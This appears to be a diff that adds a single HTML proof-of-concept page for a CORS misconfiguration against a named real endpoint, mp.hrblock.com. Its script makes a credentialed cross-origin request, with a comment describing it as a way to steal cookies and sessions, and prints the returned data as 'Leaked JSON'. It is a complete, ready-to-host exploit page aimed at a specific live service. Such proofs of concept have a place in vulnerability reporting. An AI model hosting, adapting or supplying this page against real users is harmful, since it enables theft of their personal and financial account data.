@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Takeover PoC - H&R Block</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
+        .box { border: 2px solid #333; padding: 20px; background: #fff; border-radius: 10px; display: inline-block; }
+        #data { color: red; font-weight: bold; margin-top: 20px; word-wrap: break-word; max-width: 500px; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2>Security Testing: CORS Data Leak PoC</h2>
+        <p>Target: <code>mp.hrblock.com</code></p>
+        <button onclick="fetchData()">Fetch Sensitive Data</button>
+        
+        <div id="status">Status: Waiting...</div>
+        <div id="data"></div>
+    </div>
+
+    <script>
+        function fetchData() {
+            var target_url = "https://mp.hrblock.com/idl/hrb/idl";
+            var xhr = new XMLHttpRequest();
+            var statusDiv = document.getElementById("status");
+            var dataDiv = document.getElementById("data");
+
+            statusDiv.innerHTML = "Status: Sending Request...";
+
+            xhr.open("GET", target_url, true);
+            
+            // Sabse important line: Cookies aur Sessions churaane ke liye
+            xhr.withCredentials = true; 
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4) {
+                    if (xhr.status == 200) {
+                        statusDiv.innerHTML = "Status: <span style='color:green;'>Success (Data Leaked!)</span>";
+                        dataDiv.innerHTML = "Leaked JSON: " + xhr.responseText;
+                        console.log("BOOM! Data:", xhr.responseText);
+                    } else {
+                        statusDiv.innerHTML = "Status: <span style='color:red;'>Failed (Status: " + xhr.status + ")</span>";
+                        dataDiv.innerHTML = "Check if your domain matches the vulnerable pattern.";
+                    }
+                }
+            };
+            xhr.send();
+        }
+    </script>
+</body>
+</html>
